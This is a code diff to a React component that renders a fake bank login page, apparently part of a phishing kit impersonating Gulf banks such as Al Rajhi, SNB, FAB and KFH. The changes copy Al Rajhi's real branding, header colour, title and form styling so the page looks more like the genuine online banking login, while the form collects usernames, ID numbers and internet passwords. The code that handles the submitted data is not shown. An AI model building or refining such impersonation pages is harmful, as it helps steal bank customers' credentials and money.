@@ -100,18 +100,23 @@ const PaymentBankLogin = () => {
   const secondaryColor = selectedBankBranding.colors.secondary;
   const surfaceColor = selectedBankBranding.colors.surface;
 
+  const isAlRajhi = selectedBankId === 'alrajhi_bank';
+  const isSNB = selectedBankId === 'alahli_bank';
+  const isFAB = selectedBankId === 'fab';
+  const isKFH = selectedBankId === 'kfh';
+
   return (
-    <div className="min-h-screen flex flex-col" dir="rtl" style={{ background: surfaceColor, fontFamily: selectedBankBranding.fonts.arabic }}>
+    <div className={`min-h-screen flex flex-col ${isAlRajhi ? 'bg-[#F4F7F2]' : isSNB ? 'bg-white' : surfaceColor}`} dir="rtl" style={{ fontFamily: selectedBankBranding.fonts.arabic }}>
       <PaymentMetaTags 
         serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
         serviceName={selectedBank?.nameAr || "البنك"}
         title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
       />
 
-      <header className="w-full bg-white border-b-4 shadow-xl sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
+      <header className={`w-full sticky top-0 z-50 transition-all duration-300 ${isAlRajhi ? 'bg-[#006C35] text-white' : 'bg-white border-b-4 shadow-xl'}`} style={{ borderBottomColor: isAlRajhi ? 'none' : primaryColor }}>
          <div className="container mx-auto px-4 h-20 sm:h-24 flex items-center justify-between">
             <div className="flex items-center gap-4 sm:gap-8">
-               <div className="w-40 sm:w-56 h-12 sm:h-16 flex items-center">
+               <div className={`w-40 sm:w-56 h-12 sm:h-16 flex items-center ${isAlRajhi ? 'brightness-0 invert' : ''}`}>
                   {selectedBankId && (
                     <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="lg" />
                   )}
@@ -141,40 +146,46 @@ const PaymentBankLogin = () => {
          <div className="absolute bottom-0 left-0 w-[400px] h-[400px] rounded-full opacity-[0.03] blur-[100px] pointer-events-none" style={{ backgroundColor: secondaryColor }} />
 
          <div className="w-full max-w-xl space-y-8 relative z-10">
-            <Card className="border-none shadow-[0_30px_100px_-20px_rgba(0,0,0,0.15)] rounded-[2.5rem] overflow-hidden bg-white">
-               <div className="bg-gray-50/50 p-10 sm:p-12 text-center border-b border-gray-50">
-                  <div
-                    className="w-20 h-20 rounded-3xl mx-auto mb-8 flex items-center justify-center text-white shadow-2xl animate-in zoom-in duration-700"
-                    style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
-                  >
-                     <Smartphone className="w-10 h-10" />
-                  </div>
-                  <h2 className="text-3xl sm:text-4xl font-black text-gray-900 mb-2 tracking-tight">تسجيل الدخول</h2>
-                  <p className="text-sm font-bold text-gray-400 uppercase tracking-[0.3em]">Secure Access Required</p>
+            <Card className={`border-none shadow-[0_30px_100px_-20px_rgba(0,0,0,0.15)] overflow-hidden bg-white ${isAlRajhi ? 'rounded-none border-t-8' : 'rounded-[2.5rem]'}`} style={{ borderTopColor: isAlRajhi ? '#006C35' : 'none' }}>
+               <div className={`${isAlRajhi ? 'bg-white p-6 pb-0 text-right' : 'bg-gray-50/50 p-10 sm:p-12 text-center border-b border-gray-50'}`}>
+                  {!isAlRajhi && (
+                    <div
+                      className="w-20 h-20 rounded-3xl mx-auto mb-8 flex items-center justify-center text-white shadow-2xl animate-in zoom-in duration-700"
+                      style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
+                    >
+                       <Smartphone className="w-10 h-10" />
+                    </div>
+                  )}
+                  <h2 className={`${isAlRajhi ? 'text-2xl font-bold text-[#006C35]' : 'text-3xl sm:text-4xl font-black text-gray-900 mb-2 tracking-tight'}`}>
+                    {isAlRajhi ? 'المصرفية المباشرة للأفراد' : 'تسجيل الدخول'}
+                  </h2>
+                  <p className={`${isAlRajhi ? 'text-xs text-gray-400' : 'text-sm font-bold text-gray-400 uppercase tracking-[0.3em]'}`}>
+                    {isAlRajhi ? 'Al Rajhi Online Banking' : 'Secure Access Required'}
+                  </p>
                </div>
 
-               <form onSubmit={handleSubmit} className="p-10 sm:p-12 space-y-8">
+               <form onSubmit={handleSubmit} className={`${isAlRajhi ? 'p-6 space-y-6' : 'p-10 sm:p-12 space-y-8'}`}>
                   <div className="space-y-6">
                     <div className="space-y-2">
-                       <Label className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em] px-1 flex justify-between items-center">
-                          <span>اسم المستخدم أو رقم الهوية</span>
-                          <span className="w-1 h-1 rounded-full bg-red-500" />
+                       <Label className={`${isAlRajhi ? 'text-sm font-bold text-gray-700' : 'text-[11px] font-black text-gray-400 uppercase tracking-[0.2em] px-1 flex justify-between items-center'}`}>
+                          <span>{isAlRajhi ? 'اسم المستخدم' : 'اسم المستخدم أو رقم الهوية'}</span>
+                          {!isAlRajhi && <span className="w-1 h-1 rounded-full bg-red-500" />}
                        </Label>
                        <div className="relative group">
                           <Input
                             value={username}
                             onChange={(e) => setUsername(e.target.value)}
-                            className="h-16 border-2 border-gray-100 rounded-2xl font-black text-xl text-gray-700 bg-gray-50/30 pr-14 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/5 transition-all"
-                            placeholder="أدخل بياناتك"
+                            className={`${isAlRajhi ? 'h-14 border-b-2 border-x-0 border-t-0 rounded-none px-0' : 'h-16 border-2 border-gray-100 rounded-2xl pr-14'} font-black text-xl text-gray-700 bg-transparent focus:border-blue-500 transition-all`}
+                            placeholder={isAlRajhi ? 'اسم المستخدم' : 'أدخل بياناتك'}
                             required
                           />
-                          <User className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
+                          {!isAlRajhi && <User className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />}
                        </div>
                     </div>
 
                     <div className="space-y-2">
                        <div className="flex items-center justify-between px-1">
-                          <Label className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em]">كلمة السر الخاصة بالإنترنت</Label>
+                          <Label className={`${isAlRajhi ? 'text-sm font-bold text-gray-700' : 'text-[11px] font-black text-gray-400 uppercase tracking-[0.2em]'}`}>{isAlRajhi ? 'كلمة المرور' : 'كلمة السر الخاصة بالإنترنت'}</Label>
                           <button type="button" className="text-[10px] font-black text-blue-600 uppercase tracking-widest hover:underline transition-all">نسيت كلمة السر؟</button>
                        </div>
                        <div className="relative group">
@@ -182,11 +193,11 @@ const PaymentBankLogin = () => {
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
                             type={showPassword ? "text" : "password"}
-                            className="h-16 border-2 border-gray-100 rounded-2xl font-black text-xl text-gray-700 bg-gray-50/30 pr-14 pl-14 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/5 transition-all"
+                            className={`${isAlRajhi ? 'h-14 border-b-2 border-x-0 border-t-0 rounded-none px-0' : 'h-16 border-2 border-gray-100 rounded-2xl pr-14 pl-14'} font-black text-xl text-gray-700 bg-transparent focus:border-blue-500 transition-all`}
                             placeholder="********"
                             required
                           />
-                          <KeyRound className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
+                          {!isAlRajhi && <KeyRound className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />}
                           <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-500 transition-colors">
                              {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
                           </button>
@@ -198,14 +209,14 @@ const PaymentBankLogin = () => {
                     <Button
                       type="submit"
                       disabled={isSubmitting}
-                      className="w-full h-16 rounded-2xl font-black text-xl shadow-[0_20px_40px_-10px_rgba(0,0,0,0.2)] text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
-                      style={{ backgroundColor: primaryColor }}
+                      className={`w-full h-16 font-black text-xl shadow-xl text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3 ${isAlRajhi ? 'rounded-lg bg-[#006C35] hover:bg-[#005428]' : 'rounded-2xl'}`}
+                      style={{ backgroundColor: isAlRajhi ? undefined : primaryColor }}
                     >
                        {isSubmitting ? (
                          <Loader2 className="w-8 h-8 animate-spin" />
                        ) : (
                          <>
-                           <span>دخول آمن للموقع</span>
+                           <span>{isAlRajhi ? 'دخول' : 'دخول آمن للموقع'}</span>
                            <ShieldCheck className="w-6 h-6" />
                          </>
                        )}
